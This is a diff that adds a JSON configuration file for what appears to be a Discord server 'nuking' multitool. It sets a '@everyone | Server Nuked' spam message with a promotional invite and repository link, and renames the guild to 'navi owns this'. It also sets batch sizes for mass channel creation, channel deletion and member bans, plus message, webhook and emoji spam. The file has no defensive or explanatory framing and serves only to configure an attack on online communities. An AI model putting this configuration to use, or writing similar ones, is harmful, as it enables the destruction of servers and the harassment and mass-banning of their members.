@@ -1,0 +1,23 @@
+{
+  "BOT_TOKEN": "",
+  "MESSAGE_CONTENT": "@everyone | Server Nuked | discord.gg/4qUD63pnPy | https://github.com/glockinhand/navi-multitool",
+  "WEBHOOK_URL": "This webhook for tracking your nukes",
+  "GUILD_NEW_NAME": "navi owns this",
+  "CHANNEL_AMOUNT": 60,
+  "BATCH_SIZE_CHANNELS": 60,
+  "BATCH_SIZE_DELETE": 30,
+  "BATCH_SIZE_BAN": 4,
+  "TOTAL_MESSAGES": 800,
+  "MAX_MESSAGES_PER_CHANNEL": 18,
+  "TOTAL_WEBHOOKS": 2000,
+  "WEBHOOK_DELAY": 0.06,
+  "SPAM_EMOJIS": [
+    "\ud83c\udff4",
+    "\ud83c\udf19",
+    "\ud83d\udd25",
+    "\ud83d\udc80",
+    "\ud83d\udc7e"
+  ],
+  "WEBHOOK_USERNAME": "Navi Runs Cord",
+  "COMMAND_PREFIX": "."
+}
